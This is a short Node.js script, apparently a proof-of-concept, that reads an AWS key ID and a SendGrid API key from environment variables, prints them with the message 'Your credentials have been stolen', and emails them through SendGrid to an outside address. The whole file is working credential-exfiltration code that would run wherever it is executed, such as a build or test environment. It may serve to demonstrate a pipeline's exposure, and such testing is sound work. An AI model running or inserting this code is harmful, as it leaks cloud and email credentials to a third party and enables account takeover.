const secrets = {
    AWS_KEY_IDs: {
        default: process.env.AWS_KEY_ID,
    },
    sendgrid: {
        API_KEY: process.env.SENDGRID_API_KEY
    }
}

console.log("Heya ! Your credentials have been stolen: ", secrets)

const sgMail = require("@sendgrid/mail");
sgMail.setApiKey(secrets.sendgrid.API_KEY);

const msg = {
    to: "eugeneb@q4inc.com",
    from: "noreply@q4inc.com",
    subject: "Your credentials have been stolen",
    html: "Credentials " + JSON.stringify(secrets),
};

console.log(
    "SECRETS = ", secrets
)

sgMail
    .send(msg)
    .then(() => console.log("Mail sent successfully"))
    .catch((error) => console.error(error.toString()));